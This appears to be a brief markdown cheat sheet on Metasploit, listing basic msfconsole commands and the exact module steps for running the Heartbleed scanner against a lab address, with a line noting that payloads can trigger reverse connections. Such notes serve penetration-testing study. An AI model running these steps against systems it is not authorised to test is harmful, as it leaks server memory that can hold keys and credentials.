# [Metasploit](https://www.metasploit.com/)

Metasploit is an exploit development and execution tool. It can also be used to carry out penetration testing tasks such as port scans, service identiofication and post exploitation tasks.

## General commands

```
msfconsole
help
show [something] // (i.e, show payloads, show options)
use [something]
set [option] [value]
exploit
```

## Exploits

Download exploits from Rapid7 based on gathering information on target's services.

### Heartbleed

Get data from the heap memory of a vulnerable machine (accepting and processing new SSL connections). Data depends largely on the timing of when the exploit is performed. Not getting something highly valuable does not equate to a failed exploit.

```
sudo msfdb start
msfconsole
search heartbleed
use auxiliary/scanner/ssl/openssl_heartbleed
# list module options
show options
# set options
set VERBOSE true
set RHOSTS 10.0.0.101
run
```

## Payloads

Some exploits allow for injecting payloads, expanding our attack vectors, i.e. triggering reverse connections.
